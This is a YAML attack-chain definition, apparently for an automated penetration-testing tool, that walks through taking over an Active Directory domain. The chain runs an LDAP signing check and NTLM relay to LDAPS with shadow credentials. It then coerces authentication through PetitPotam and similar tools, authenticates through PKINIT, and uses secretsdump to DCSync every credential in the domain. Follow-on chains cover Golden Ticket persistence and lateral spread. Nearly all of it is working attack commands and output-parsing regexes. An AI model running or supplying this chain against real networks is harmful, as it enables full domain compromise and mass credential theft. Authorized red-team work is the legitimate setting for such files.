id: ldap-relay-shadow-cred
name: "AD — LDAPS relay + Shadow Credentials (no signing required)"
description: >
  LDAP signing isn't enforced by default. Relay coerced auth to LDAPS,
  write a KeyCredentialLink to a high-value target, then PKINIT as that
  target. Single-shot domain takeover when ADCS is reachable.
tags: [ntlm-relay, ldap, shadow-credentials, adcs, priv-esc]
difficulty: hard

inputs:
  - name: dc_ip
    source: target_context.ip
    required: true
  - name: target_principal
    description: "User/computer to take over (defaults to a DC for full takeover)."
    required: true
  - name: listener_ip
    description: "Your attacker IP."
    required: true

steps:
  - id: ldap_signing_check
    name: "Check LDAP signing requirement"
    inline_command: "nxc ldap <dc-ip> -u '' -p '' -M ldap-checker"
    inputs:
      dc-ip: "${dc_ip}"
    notes: |
      Output:
        LDAP signing NOT enforced — green light, signing relay viable.
        LDAP signing enforced — must use LDAPS (TLS) channel binding bypass.

  - id: start_listener
    name: "Start ntlmrelayx with shadow-credentials"
    command_ref: ntlmrelayx-ldaps
    inputs:
      ip: "${dc_ip}"
    notes: |
      Use the LDAPS variant (channel binding not enforced by default at
      Server <= 2016). The `--shadow-credentials` flag tells the script
      to write msDS-KeyCredentialLink on relay success.
      Full command:
        impacket-ntlmrelayx -t ldaps://<dc> --shadow-credentials \
          --shadow-target '<target_principal>'

  - id: coerce
    name: "Coerce a victim to authenticate to your relay"
    command_ref: coercer
    inputs:
      listener_ip: "${listener_ip}"
      target_ip: "${dc_ip}"
    notes: |
      Pick a high-priv victim:
        - DC itself (DC$ → has GenericAll on most objects).
        - A server you don't have access to (its machine account writes to itself).
      Coercer tries PetitPotam, PrinterBug, DFSCoerce, ShadowCoerce — one
      usually lands.

  - id: capture_pfx
    name: "Capture the PFX from ntlmrelayx output"
    inline_command: "# Look in the ntlmrelayx terminal for:\n# [+] Saved PFX (#PKCS12) certificate to <target>.pfx"
    capture:
      - var: relayed_pfx
        regex: "Saved PFX [^\n]*to (\\S+\\.pfx)"
        match: first

  - id: pkinit_auth
    name: "Authenticate as the target via PKINIT"
    command_ref: certipy-auth
    requires: [relayed_pfx]
    inputs:
      pfx_file: "${relayed_pfx}"
      ip: "${dc_ip}"
    capture:
      - var: target_nt_hash
        regex: "(?:NT hash|Got hash for[^:]+):[^a-f0-9]*([a-f0-9]{32})"
        match: first

  - id: domain_takeover
    name: "Use the NT hash → DCSync if target was DC"
    inline_command: "impacket-secretsdump -hashes ':<hash>' '<domain>/<target>@<dc-ip>' -just-dc"
    inputs:
      hash: "${target_nt_hash}"
      dc-ip: "${dc_ip}"
    notes: |
      DC machine accounts (DC01$) hold DCSync rights — using the NT hash
      with secretsdump's -just-dc dumps every credential in the domain.

references:
  - title: "Shadow Credentials via NTLM relay"
    url:   "https://www.thehacker.recipes/ad/movement/credentials/shadow-credentials"
  - title: "PetitPotam"
    url:   "https://github.com/topotam/PetitPotam"

next_chains:
  - chain: ad-persistence-golden-ticket
    when:   'krbtgt hash captured'
    reason: 'krbtgt → Golden Ticket persistence.'
  - chain: pth-lateral-spread
    when:   'NTLM hashes captured'
    reason: 'Spread the new identities.'
